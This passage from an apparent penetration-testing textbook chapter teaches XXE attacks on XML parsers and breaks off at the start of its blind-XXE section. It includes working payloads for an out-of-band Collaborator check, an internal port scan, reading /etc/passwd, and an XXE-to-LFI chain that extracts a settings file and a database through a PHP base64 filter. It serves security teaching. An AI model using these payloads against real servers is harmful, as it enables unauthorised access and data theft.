<html><head></head><body><div class="chapter" title="Chapter&#xA0;10.&#xA0;Practical Server-Side Attacks"><div class="titlepage"><div><div><h1 class="title"><a id="ch10"/>Chapter 10. Practical Server-Side Attacks</h1></div></div></div><p>In the previous chapter, we went through a series of practical attacks against users, leveraging application vulnerabilities to achieve our goal. The focus of this chapter will be server-side attacks, primarily by exploiting XML vulnerabilities. Despite the fact that JSON has gained a large market share of data exchange in web applications, XML is still fairly prevalent. It's not as clean as JSON and can be a bit harder to read, but it is mature. There are a ton of XML-parsing libraries for any language a developer may choose to complete a project with. Java is still popular in the enterprise world and the Android phenomenon has only spawned more Java enthusiasts. Microsoft is still very fond of XML and you'll find it all over its operating system, in the application manifests, and in IIS website configuration files.</p><p>The goal of this chapter is to get you comfortable with XML attacks and, by the end, you will be familiar with:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">DoS conditions</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Server-Side Request Forgery</strong></span> (<span class="strong"><strong>SSRF</strong></span>) attacks</li><li class="listitem" style="list-style-type: disc">Information leaks</li><li class="listitem" style="list-style-type: disc">Blind exploitation and out-of-band exfiltration of data</li><li class="listitem" style="list-style-type: disc">Remote code execution</li></ul></div><p>On your travels, you no doubt have come across XML and, at first glance, it looks similar to HTML. There's a header that describes the document and it typically looks like this:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</pre></div><p>This is followed by arbitrary tags, which describe the data contained within the document. While HTML instructs a client, such as a browser, on how to render data, XML is used to describe the data itself and is therefore referred to as self-describing. The data is defined, or described, by building blocks called elements. An example XML document looks like this:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;user&gt;
  &lt;name&gt;Dade Murphy&lt;/name&gt;
  &lt;id&gt;1&lt;/id&gt;
  &lt;email&gt;admin@localhost&lt;/email&gt;
&lt;/user&gt;</pre></div><p>The <code class="literal">&lt;user&gt;</code> element indicates the type of record and its boundary is <code class="literal">&lt;/user&gt;</code>, much like HTML. This is also the root element. Within this record, we have <code class="literal">&lt;name&gt;</code>, <code class="literal">&lt;id&gt;</code>, and <code class="literal">&lt;email&gt;</code> entries with the appropriate values. It's important to note that any application that parses this data must know what to do with the contents. Modern web browsers know what to do with HTML's <code class="literal">&lt;div&gt;</code> and <code class="literal">&lt;a&gt;</code> because they all follow a standard. Applications exchanging XML data must agree on what that data is, and how it is processed or rendered. An XML structure can be valid from a syntax point of view (that is, all the tags are properly closed, there's a root element, and the document header is present), but it may be missing expected elements and applications may crash or waste resources attempting to parse the data.</p><div class="section" title="Internal and external references"><div class="titlepage"><div><div><h1 class="title"><a id="ch10lvl1sec58"/>Internal and external references</h1></div></div></div><p>A <span class="strong"><strong>document type definition</strong></span> (<span class="strong"><strong>DTD</strong></span>) is<a id="id488" class="indexterm"/> used to the proper way to build a particular document. DTDs are referenced in XML documents by the use of a document type declaration (<code class="literal">DOCTYPE</code>) element. DTDs can be written out in full inside the XML document, or they can be referenced externally for the parser to download and process.</p><p>Internal DTDs<a id="id489" class="indexterm"/> can be found near the top of the XML document, in the <code class="literal">DOCTYPE</code> tag:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
<span class="strong"><strong>&lt;!DOCTYPE user [</strong></span>
  <span class="strong"><strong>&lt;!ELEMENT user ANY&gt;</strong></span>
  <span class="strong"><strong>&lt;!ENTITY company "Ellingson Mineral Company"&gt;</strong></span>
<span class="strong"><strong>]&gt;</strong></span>
&lt;user&gt;
  &lt;name&gt;Dade Murphy&lt;/name&gt;
  &lt;id&gt;1&lt;/id&gt;
  &lt;email type="local"&gt;admin@localhost&lt;/email&gt;
  &lt;company&gt;<span class="strong"><strong>&amp;company;</strong></span>&lt;/company&gt;
&lt;/user&gt;</pre></div><p>The preceding<a id="id490" class="indexterm"/> internal DTD defines the <code class="literal">user</code> root element and an internal entity, <code class="literal">company</code>, which is defined to hold the string value <code class="literal">"Ellingson Mineral Company"</code>. Within the document itself, the company entity can be referenced using the ampersand and semicolon wrappers, which should look familiar if you have some HTML experience. When the parser reaches the <code class="literal">&amp;company;</code> string, it will insert the value defined in the preceding DTD.</p><p>As I've said previously, it is<a id="id491" class="indexterm"/> also possible to point the XML parser of our document to an external DTD file. The parser will simply go and fetch this file before the rest of the document is processed. External DTDs<a id="id492" class="indexterm"/> are referenced in the <code class="literal">DOCTYPE</code> by preceding them with the <code class="literal">SYSTEM</code> keyword:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
<span class="strong"><strong>&lt;!DOCTYPE user SYSTEM "user.dtd"&gt;</strong></span>
&lt;user&gt;
  &lt;name&gt;Dade Murphy&lt;/name&gt;
  &lt;id&gt;1&lt;/id&gt;
  &lt;email type="local"&gt;admin@localhost&lt;/email&gt;
  &lt;company&gt;<span class="strong"><strong>&amp;company;</strong></span>&lt;/company&gt;
&lt;/user&gt;</pre></div><p>The <code class="literal">user.dtd</code> file will contain our entity and element definitions:</p><div class="informalexample"><pre class="programlisting">&lt;!DOCTYPE user [
  &lt;!ELEMENT user ANY&gt;
  &lt;!ENTITY <span class="strong"><strong>company</strong></span> "Ellingson Mineral Company"&gt;
]&gt;</pre></div><p>The <code class="literal">company</code> entity will be expanded, as before, once the DTD is successfully downloaded and parsed.</p><p>Just like our external DTD definition, we can reference external entities as well. The syntax is similar to referencing external DTDs: it calls for the <code class="literal">SYSTEM</code> keyword and a URI:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
<span class="strong"><strong>&lt;!DOCTYPE user [&lt;!ELEMENT user ANY&gt;&lt;!ENTITY company SYSTEM "http://config.ecorp.local/company.xml"&gt;]&gt;</strong></span>
&lt;user&gt;
  &lt;name&gt;Dade Murphy&lt;/name&gt;
  &lt;id&gt;1&lt;/id&gt;
  &lt;email type="local"&gt;admin@localhost&lt;/email&gt;
  &lt;company&gt;<span class="strong"><strong>&amp;company;</strong></span>&lt;/company&gt;
&lt;/user&gt;</pre></div><p>We can pass this XML document to a parser as part of, say, an API authentication request. When it's time to resolve the <code class="literal">&amp;company;</code> entity, the parser will make an HTTP connection to <code class="literal">config.ecorp.local</code> and the contents will be echoed in the <code class="literal">&lt;company&gt;</code> element.</p><p>The attacker mindset will take note of the ability of a user to influence server behavior and potentially look for ways to abuse it.</p></div></div>
<div class="section" title="XXE attacks"><div class="titlepage"><div><div><h1 class="title"><a id="ch10lvl1sec59"/>XXE attacks</h1></div></div></div><p>XXE attacks take <a id="id493" class="indexterm"/>advantage of the fact that XML libraries allow for these external references for DTDs or entities. Developers may not be aware of this potential attack vector and XML input is sometimes left unsanitized. As attackers communicating with an API, for example, we can intercept SOAP XML requests and inject our own XML elements in the payload. The server-side component must parse this payload in order to know what to do with the data. If the parser is not properly configured and it allows external entities, we can abuse the server to read files on the system, perform SSRF attacks, perform DoS attacks, and in some cases even execute code.</p><div class="section" title="A billion laughs"><div class="titlepage"><div><div><h2 class="title"><a id="ch10lvl2sec45"/>A billion laughs</h2></div></div></div><p>The <span class="strong"><strong>billion laughs attack</strong></span>, also <a id="id494" class="indexterm"/>known as<a id="id495" class="indexterm"/> an <span class="strong"><strong>XML bomb</strong></span>, is a<a id="id496" class="indexterm"/> DoS attack that aims to overload the XML parser by causing it to allocate more memory than it has available with a relatively small input buffer. On older systems, or virtual machines with limited memory, a parser bomb could quickly crash the application or even the host.</p><p>The XML bomb exploits the fact that file formats such as XML allow the user to specify references or pointers to other arbitrarily defined data. In the earlier examples, we used entity expansion to replace <code class="literal">&amp;company;</code> with data defined either in the header of the document or somewhere externally.</p><p>An XML bomb looks like this:</p><div class="mediaobject"><img src="graphics/B09238_10_01.jpg" alt="A billion laughs"/><div class="caption"><p>Figure 10.1: XML bomb attack</p></div></div><p>A parser will look at this data and<a id="id497" class="indexterm"/> begin expanding the entities, starting with the <code class="literal">&lt;lolz&gt; </code>root element. A reference to the <code class="literal">&amp;lol9;</code> entity will point to 10 other references defined by <code class="literal">&amp;lol8</code>;. This is repeated until the first entity, <code class="literal">&amp;lol</code>;, expands to the <code class="literal">"lol"</code> string. The<a id="id498" class="indexterm"/> result is the memory allocation of 10^9 (1,000,000,000) instances of the <code class="literal">"lol"</code> string, or a billion lols. This alone can take up to 3 GB of memory, depending on the parser and how it handles strings in memory. On modern servers, the impact may be minimal, unless this attack is distributed through multiple connections to the application.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note57"/>Note</h3><p>As always, take care when testing for these types of vulnerabilities on client systems. DoS attacks are not usually allowed during engagements. On rare occasions where DoS is allowed, an XML bomb may be a good way to tie up resources in the blue team while you focus on other parts of the network, provided the system is not business-critical.</p></div></div><p>XML is not the only file format that allows for this type of DoS attack. In fact, any language that has constructs for creating pointers to other data can be abused in a similar fashion. YAML, a human-readable file format typically used in configuration files, also allows for pointers to data and thus the YAML bomb:</p><div class="mediaobject"><img src="graphics/B09238_10_02.jpg" alt="A billion laughs"/><div class="caption"><p>Figure 10.2: YAML billion laughs attack</p></div></div><p>The effect of these attacks <a id="id499" class="indexterm"/>varies greatly, depending on the library and its memory management, as well as the underlying operating system and its available memory. While not all bombs will crash a system, they do illustrate the importance of input sanitization. Subverting confidentiality and violating integrity may be sexier, but when availability can so easily be influenced with a few lines of code, defenders should pay attention.</p></div><div class="section" title="Request forgery"><div class="titlepage"><div><div><h2 class="title"><a id="ch10lvl2sec46"/>Request forgery</h2></div></div></div><p>A <span class="strong"><strong>request forgery</strong></span> attack<a id="id500" class="indexterm"/> occurs when an application is coerced into making <a id="id501" class="indexterm"/>a request to another host or hosts of the attacker's choosing. External entity expansion attacks are a form of SSRF, as they coerce the application into connecting to arbitrary URLs in order to download DTDs or other XML data.</p><p>In the worst-case scenario (or best case, depending on your perspective), a request forgery such as XXE can result in information leakage, blind data exfiltration, or even remote code execution, as we'll see later on. However, SSRF can also be used to chain attacks to internal, non-public servers, or even to conduct port scans.</p><p>To illustrate this particular attack, we will use this XML parsing application written in PHP. The code should be fairly simple to understand for most non-developers:</p><div class="mediaobject"><img src="graphics/B09238_10_03.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.3: Simple PHP XML parser</p></div></div><p>A quick overview of the code:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Lines 7 to 11 define a form in HTML that allows the user to submit XML data via a <code class="literal">POST</code> request.</li><li class="listitem" style="list-style-type: disc">Lines 2 to 5 will <a id="id502" class="indexterm"/>process the incoming XML text using the <code class="literal">SimpleXML</code> PHP module. The <a id="id503" class="indexterm"/>parsed data will be stored as an XML object: <code class="literal">$xml_object</code>.</li><li class="listitem" style="list-style-type: disc">Lines 13 to 23 will neatly display the parsed XML data.</li></ul></div><p>We can start a temporary web server from the command-line to test some SSRF attacks against our vulnerable XML-parsing application using the built-in PHP test server:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html# php -S 0.0.0.0:80</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note58"/>Note</h3><p>For the sake of this demo, our application will be accessible via <code class="literal">http://xml.parser.local</code>.</p></div></div><div class="mediaobject"><img src="graphics/B09238_10_04.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.4: Vulnerable PHP XML parser running</p></div></div><p>In order to test the parser's external entity expansion capabilities, we can use the form to send a short XML payload<a id="id504" class="indexterm"/> describing a book. We will use an external entity<a id="id505" class="indexterm"/> hosted by Burp Collaborator. This isn't a valid payload, as Collaborator responds with a canned HTML answer, but it will allow us to confirm that the application is vulnerable.</p><p>Let's create a new Collaborator client instance and pass the generated host to the application in our payload:</p><p>From the <span class="strong"><strong>Burp</strong></span> menu, select the <span class="strong"><strong>Burp Collaborator client</strong></span> option:</p><div class="mediaobject"><img src="graphics/B09238_10_05.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.5: Starting the Burp Collaborator client module</p></div></div><p>We will generate one Collaborator host and select <span class="strong"><strong>Copy to clipboard</strong></span> in the client window. It's important that we<a id="id506" class="indexterm"/> do not close the Collaborator client for the<a id="id507" class="indexterm"/> duration of the attack after generating a hostname. If we close it prematurely, Collaborator will not be able to link out-of-band requests made to the hostname with our Burp session:</p><div class="mediaobject"><img src="graphics/B09238_10_06.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.6: Copy the generated Collaborator hostname to the clipboard</p></div></div><p>The value generated will look similar to this:</p><div class="informalexample"><pre class="programlisting">gl50wfrstsbfymbxzdd454v2ut0jo8.burpcollaborator.net</pre></div><p>We will now build an XML document that fetches the <code class="literal">publisher</code> value from the Burp Collaborator host we've just generated. We hope that when the vulnerable application attempts to fetch the external content, Burp Collaborator will be able to intercept the request and confirm the vulnerability:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE book [
  &lt;!ELEMENT book ANY &gt;
  &lt;!ENTITY publisher SYSTEM "<span class="strong"><strong>http://gl50wfrstsbfymbxzdd454v2ut0jo8.burpcollaborator.net/publisher.xml</strong></span>"&gt;
]&gt;
&lt;book&gt;
  &lt;title&gt;The Flat Mars Society&lt;/title&gt;
  &lt;publisher&gt;&amp;publisher;&lt;/publisher&gt;
  &lt;author&gt;Elon Musk&lt;/author&gt;
&lt;/book&gt;</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note59"/>Note</h3><p>Collaborator is not required for this confirmation. We can use a simple HTTP server running on our C2 server somewhere in the cloud. Collaborator is useful when HTTPS is needed in a rush, or if confirmation has to be done via DNS or some other protocol.</p></div></div><p>The result is a neatly<a id="id508" class="indexterm"/>­ parsed object <a id="id509" class="indexterm"/>displayed in red at the bottom of the screen:</p><div class="mediaobject"><img src="graphics/B09238_10_07.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.7: Submitting the XML payload and observing the response</p></div></div><p>We can see that the <code class="literal">&amp;publisher;</code> entity was resolved by the parser, which means the application made an <a id="id510" class="indexterm"/>external HTTP connection to our Collaborator instance. It's<a id="id511" class="indexterm"/> interesting to note that the HTML response was successfully interpreted as XML successfully by the parser, due to the structure similarity of XML and HTML:</p><div class="informalexample"><pre class="programlisting">&lt;html&gt;
  &lt;body&gt;<span class="strong"><strong>[content]</strong></span>&lt;/body&gt;
&lt;/html&gt;</pre></div><p>Polling the Collaborator server from the client confirms the existence of this vulnerability and now we know we can influence the server in some way:</p><div class="mediaobject"><img src="graphics/B09238_10_08.jpg" alt="Request forgery"/><div class="caption"><p>Figure 10.8: Collaborator client confirms SSRF vulnerability</p></div></div><div class="section" title="The port scanner"><div class="titlepage"><div><div><h3 class="title"><a id="ch10lvl3sec09"/>The port scanner</h3></div></div></div><p>Knowing that we can point <a id="id512" class="indexterm"/>the application to any URL and it will connect to it, we can abuse this <a id="id513" class="indexterm"/>to perform a crude port scan of the internal network (or any other host for that matter). We can scan for more than just HTTP ports. URLs allow for the specification of an arbitrary port, and while it may try to negotiate an HTTP connection, we can still infer the existence of an SMTP service by just examining the parser connection attempt error message.</p><p>Since we are forging our request to come from the vulnerable XML parser application, all port scan attempts will appear to come from an internal trusted system. This is good from a stealth perspective, and in some cases, can avoid triggering alarms.</p><p>The XML code we'll use for our XXE port scanner will target the <code class="literal">10.0.5.19</code> internal host, looking for interesting services: <code class="literal">8080</code>, <code class="literal">80</code>, <code class="literal">443</code>, <code class="literal">22</code>, and <code class="literal">21</code>:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE budgetnmap [
  &lt;!ELEMENT budgetnmap ANY&gt;
  <span class="strong"><strong>&lt;!ENTITY port0 SYSTEM "http://10.0.5.19:8080/"&gt;</strong></span>
  <span class="strong"><strong>&lt;!ENTITY port1 SYSTEM "http://10.0.5.19:80/"&gt;</strong></span>
  <span class="strong"><strong>&lt;!ENTITY port2 SYSTEM "http://10.0.5.19:443/"&gt;</strong></span>
  <span class="strong"><strong>&lt;!ENTITY port3 SYSTEM "http://10.0.5.19:22/"&gt;</strong></span>
  <span class="strong"><strong>&lt;!ENTITY port4 SYSTEM "http://10.0.5.19:21/"&gt;</strong></span>
]&gt;
&lt;budgetnmap&gt;
&amp;port0;
&amp;port1;
&amp;port2;
&amp;port3;
&amp;port4;
&lt;/budgetnmap&gt;</pre></div><p>Once uploaded to the<a id="id514" class="indexterm"/> application for parsing, the payload will force the XML parser<a id="id515" class="indexterm"/> into systematically connecting to each specified port, in an attempt to fetch data for the <code class="literal">&amp;portN;</code> entities:</p><div class="mediaobject"><img src="graphics/B09238_10_09.jpg" alt="The port scanner"/><div class="caption"><p>Figure 10.9: XXE port scanner showing error messages for open ports</p></div></div><p>The server response is a bit messy, but it does provide us with enough information to see that port <code class="literal">80</code> is actually open on the internal <code class="literal">10.0.5.19</code> host. The parser was able to connect to the port and, while it failed to parse its contents, the error message speaks volumes. Conversely, entity <code class="literal">&amp;port0;</code> returned a<code class="literal"> Connection timed out</code> error message, which indicates that the port is likely firewalled.</p><p>Burp Suite has a neat<a id="id516" class="indexterm"/> feature where it allows us to copy any request captured as a <code class="literal">curl</code> command. If we wish to<a id="id517" class="indexterm"/> repeat this attack on another internal host and perhaps parse the response for another tool, we can quickly copy the payload with a single click:</p><div class="mediaobject"><img src="graphics/B09238_10_10.jpg" alt="The port scanner"/><div class="caption"><p>Figure 10.10: Save the Burp request as a curl command</p></div></div><p>The generated <code class="literal">curl</code> command can be piped to <code class="literal">grep</code> and we can filter only lines containing <code class="literal">"http:"</code> to make reading the output a bit cleaner:</p><div class="informalexample"><pre class="programlisting">curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'xml=%3C%3Fxml+version%3D%221.0%22+[...]%3C%2Fbudgetnmap%3E%0D%0A&amp;submit_xml=Parse+XML' $'http://xml.parser.local/xml.php' | <span class="strong"><strong>grep "http:"</strong></span>
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(<span class="strong"><strong>http://10.0.5.19:8080/</strong></span>): failed to open stream: <span class="strong"><strong>Connection timed out</strong></span> in &lt;b&gt;/var/www/html/xml/xml.php&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;
[...]
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): <span class="strong"><strong>http://10.0.5.19:80/</strong></span>:1: parser error : <span class="strong"><strong>StartTag: invalid element name</strong></span> in &lt;b&gt;/var/www/html/xml/xml.php&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;
[...]
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(<span class="strong"><strong>http://10.0.5.19:443/</strong></span>): failed to open stream: <span class="strong"><strong>Connection timed out</strong></span> in &lt;b&gt;/var/www/html/xml/xml.php&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;
[...]
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(<span class="strong"><strong>http://10.0.5.19:22/</strong></span>): failed to open stream: <span class="strong"><strong>Connection timed out</strong></span> in &lt;b&gt;/var/www/html/xml/xml.php&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;
[...]
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(<span class="strong"><strong>http://10.0.5.19:21/</strong></span>): failed to open stream: <span class="strong"><strong>Connection timed out</strong></span> in &lt;b&gt;/var/www/html/xml/xml.php&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;</pre></div><p>From here, we can get a bit more fancy by automating payload generation or cleaning up the output further.</p></div></div><div class="section" title="Information leak"><div class="titlepage"><div><div><h2 class="title"><a id="ch10lvl2sec47"/>Information leak</h2></div></div></div><p>XXE can also be used to read <a id="id518" class="indexterm"/>any file on disk that the application has access to. Of course, most <a id="id519" class="indexterm"/>of the time, the more valuable files are the application's source code, which is a common target for attackers. Remember that external entities are accessed using a URL, and in PHP, the file system is accessible via the <code class="literal">file://</code> URL prefix.</p><p>To read the <code class="literal">/etc/passwd</code> file on a Linux system, a simple payload such as this will work:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
    &lt;!ELEMENT xxe ANY &gt;
    &lt;!ENTITY exfil SYSTEM "<span class="strong"><strong>file:///etc/passwd</strong></span>"&gt;
]&gt;
&lt;xxe&gt;&amp;exfil;&lt;/xxe&gt;</pre></div><p>The result is predictable and a good proof of concept for our report to the client. The XML parser will reach out over the <code class="literal">file://</code> scheme, grab the contents of <code class="literal">/etc/passwd</code>, and display them no the screen:</p><div class="mediaobject"><img src="graphics/B09238_10_11.jpg" alt="Information leak"/><div class="caption"><p>Figure 10.11: Exploiting XXE to retrieve /etc/passwd</p></div></div><p>As I alluded to earlier, there<a id="id520" class="indexterm"/> are more high-value targets to consider for exfiltration with<a id="id521" class="indexterm"/> this type of attack: the application's source code, private keys (SSH private keys and certificate private keys), history files, operating system configuration files or scripts, and much more. If the application can read the files on disk, so can we.</p><p>Local files are not the only thing we can touch with this exploit, however. SSRF attacks, such as XXE, can also be used to target internal applications that may not be accessible from an outside network, such as other virtual local area networks (VLANs) or the internet.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note60"/>Note</h3><p>The internal application running on <code class="literal">10.0.5.19</code> that we will use for demonstration purposes is the awesome <span class="strong"><strong>badguys</strong></span> project from Mike Pirnat. The web application code can be downloaded from <a class="ulink" href="https://github.com/mpirnat/lets-be-bad-guys">https://github.com/mpirnat/lets-be-bad-guys</a>.</p></div></div><p>Consider a scenario where, after further investigation of the server that we successfully scanned earlier, we've realized <code class="literal">10.0.5.19</code> was running an application vulnerable to LFI attacks. We cannot access <code class="literal">10.0.5.19</code> directly from our network segment and only the target <code class="literal">xml.parser.local</code> application is exposed to us. Normally, we'd be unable to attack <code class="literal">10.0.5.19</code>, but thanks to the XXE SSRF issue, we can force the XML parser to conduct the attack on our behalf.</p><p>We will build a payload to pass to <code class="literal">xml.parser.local</code>, which will force it to connect to our target internal server and retrieve the settings file from the vulnerable application using an LFI attack.</p><p>The badguys application running on the internal <code class="literal">10.0.5.19</code> host is vulnerable to LFI in the <code class="literal">/user-pic</code> URL parameter, <code class="literal">p</code>:</p><div class="informalexample"><pre class="programlisting">http://10.0.5.19/user-pic?p=<span class="strong"><strong>[LFI]</strong></span>
</pre></div><p>This particular vulnerable <a id="id522" class="indexterm"/>application is open-source and a quick GitHub search tells us <a id="id523" class="indexterm"/>everything we need to know about the file folder structure. This is also true for other frameworks and CMSs. A WordPress installation vulnerable to LFI can be exploited to grab the contents of <code class="literal">wp-config.php</code> just as easily.</p><p>We know what the relative path to the settings file is because we looked it up, and we can use that as the injection payload for the LFI exploitation. The badguys application stores its settings in a file called <code class="literal">settings.py</code>, usually stored two directories up the chain from the current working directory.</p><p>To grab this file's contents, our XML payload will look something like this:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT xxe ANY &gt;
  &lt;!ENTITY exfil SYSTEM "<span class="strong"><strong>http://10.0.5.19/user-pic?p=../../settings.py</strong></span>"&gt;
]&gt;
&lt;xxe&gt;<span class="strong"><strong>&amp;exfil;</strong></span>&lt;/xxe&gt;</pre></div><p>Instead of the Collaborator hostname, we will ask the XML server to reach out to the internal host and return the response back to us. If all goes well, the XML parser will exploit the internal badguys application running on <code class="literal">10.0.5.19</code>, giving us the contents of the <code class="literal">settings.py</code> file:</p><div class="mediaobject"><img src="graphics/B09238_10_12.jpg" alt="Information leak"/><div class="caption"><p>Figure 10.12: Using XXE to exploit LFI on an internal host</p></div></div><p>The <code class="literal">settings.py</code> file has<a id="id524" class="indexterm"/> some interesting information, including database credentials <a id="id525" class="indexterm"/>and <code class="literal">sqlite3</code> file paths. It doesn't hurt to make a note of this for future use. A file of interest is the SQLite 3 database itself, located at <code class="literal">c:\db\badguys.sqlite3</code> on the <code class="literal">10.0.5.19</code> internal host.</p><p>We can use the same LFI attack to grab its contents as well.</p><p>There is one problem with just changing the <code class="literal">p</code> path to the database file:</p><div class="informalexample"><pre class="programlisting">http://10.0.5.19/user-pic?p=<span class="strong"><strong>../../../../../../db/badguys.sqlite3</strong></span>
</pre></div><p>In normal LFI situations, this will work just fine. We traverse enough directories to reach the root of the drive, change directory to <code class="literal">db</code>, and fetch the <code class="literal">badguys.sqlite3</code> file.</p><p>You'll notice that, in our payload, the contents of the SQLite 3 database will be fetched and inserted in the <code class="literal">&lt;xxe&gt;</code> tag before the parser processes the XML data:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT xxe ANY &gt;
  &lt;!ENTITY exfil SYSTEM "http://10.0.5.19/user-pic?p=../../../../../../db/badguys.sqlite3"&gt;
]&gt;
<span class="strong"><strong>&lt;xxe&gt;&amp;exfil;&lt;/xxe&gt;</strong></span>
</pre></div><p>SQLite 3's file format will contain characters that most XML parsers will have a problem processing, and therefore parse errors may prevent us from grabbing the contents.</p><p>If we run our payload as is, we <a id="id526" class="indexterm"/>observe that even though the contents of the database <a id="id527" class="indexterm"/>were fetched, the application did not return them because it tried to parse them as part of the <code class="literal">&lt;xxe&gt;</code> tag. SQLite 3's binary format is not really XML-friendly:</p><div class="mediaobject"><img src="graphics/B09238_10_13.jpg" alt="Information leak"/><div class="caption"><p>Figure 10.13: XXE attack fails to return the contents of the database</p></div></div><p>To get around this issue, ideally, we want the XML parser to encode the data it retrieves from the vulnerable internal application before it injects it into the <code class="literal">&lt;xxe&gt;</code> tag for processing.</p><p>The XML parser application is written in PHP and therefore has access to various conversion filters, which can<a id="id528" class="indexterm"/> be applied to streaming data, such as a resource fetched<a id="id529" class="indexterm"/> from a URL. Filters can be accessed via the <code class="literal">php://</code> scheme, as shown:</p><div class="informalexample"><pre class="programlisting">php://filter/convert.base64-encode/resource=<span class="strong"><strong>[URL]</strong></span>
</pre></div><p>One of the conversion filters available is <code class="literal">base64-encode</code>, which will prove useful in our case.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note61"/>Note</h3><p>PHP's documentation shows all the available filters at <a class="ulink" href="http://php.net/manual/en/filters.php">http://php.net/manual/en/filters.php</a>. Data can be converted, encrypted, or compressed in-flight.</p></div></div><p>To Base64-encode the contents of the SQLite 3 database, we will have to forge a request to the following URI:</p><div class="informalexample"><pre class="programlisting">php://filter/convert.base64-encode/resource=<span class="strong"><strong>http://10.0.5.19/user-pic?p=../../../../../../db/badguys.sqlite3</strong></span>
</pre></div><p>The <code class="literal">convert.base64-encode</code> filter is applied to the remote resource containing the database contents we need. The return will be a long Base64 string and it shouldn't cause any more parser errors:</p><div class="mediaobject"><img src="graphics/B09238_10_14.jpg" alt="Information leak"/><div class="caption"><p>Figure 10.14: Repeating the attack using the PHP Base64 filter modification</p></div></div><p>We can now run the <a id="id530" class="indexterm"/>Base64 response<a id="id531" class="indexterm"/> through CyberChef with the option of saving the decoded data to a file:</p><div class="mediaobject"><img src="graphics/B09238_10_15.jpg" alt="Information leak"/><div class="caption"><p>Figure 10.15: SQL database extracted from an internal host</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note62"/>Note</h3><p>CyberChef<a id="id532" class="indexterm"/> is a great tool for data manipulation, available online or for download from GCHQ at <a class="ulink" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a>.</p></div></div><p>Success! We managed to leak a database from an internal system by chaining two exploits:</p><div class="informalexample"><pre class="programlisting">XML External Entity (<span class="strong"><strong>XXE</strong></span>) Server-side Request Forgery (<span class="strong"><strong>SSRF</strong></span>) -&gt; Local File Inclusion (<span class="strong"><strong>LFI</strong></span>)</pre></div><p>As we've seen, request forgery, particularly XXE (since we can retrieve the contents of the response), can be extremely valuable in an engagement.</p></div><div class="section" title="Blind XXE"><div class="titlepage"><div><div><h2 class="title"><a id="ch10lvl2sec48"/>Blind XXE</h2></div></div></div><p>As you have <a id="id533" class="indexterm"/>probably witnessed in your<a id="id534" class="indexterm"/> day-to-day role, not all XML parsers are as verbose as the preceding example. Many web applications are configured to suppress errors and warnings, and sometimes will not echo any useful data back to you. The preceding attacks relied on the fact that the payload was processed and the entities were echoed out to the screen. This allowed us to exfiltrate the data easily.</p><p>In some cases, however, this may not be possible.</p><p>To showcase this attack, we <a id="id535" class="indexterm"/>will patch our XML parser application to suppress PHP error messages<a id="id536" class="indexterm"/> and display a generic message after every submission:</p><div class="mediaobject"><img src="graphics/B09238_10_16.jpg" alt="Blind XXE"/><div class="caption"><p>Figure 10.16: The modified PHP XML parser does not return data</p></div></div><p>Lines 2, 3, and 22 will render our previous information leak attacks useless. Even if we exploit XXE successfully, we will not be able to see the contents of whatever file we attempt to retrieve. SSRF attacks will still work, however, but are not as straightforward to exploit practically.</p><div class="mediaobject"><img src="graphics/B09238_10_17.jpg" alt="Blind XXE"/><div class="caption"><p>Figure 10.17: A blind XXE attack does not produce any useable output</p></div></div><p>How do we go about<a id="id537" class="indexterm"/> exfiltrating the data if the application does not return anything useful after exploitation?</p><p>We have to get a bit more creative. Out-of-band vulnerability identification uses a C2 server to confirm that the application is vulnerable, by observing incoming network connections. Confirming blind XXE vulnerabilities can be done out-of-band as well and, as shown in the previous example, using Burp Collaborator or an external C2 server.</p><p>What if, instead of<a id="id538" class="indexterm"/> instructing the XML parser to return the data we need with the <code 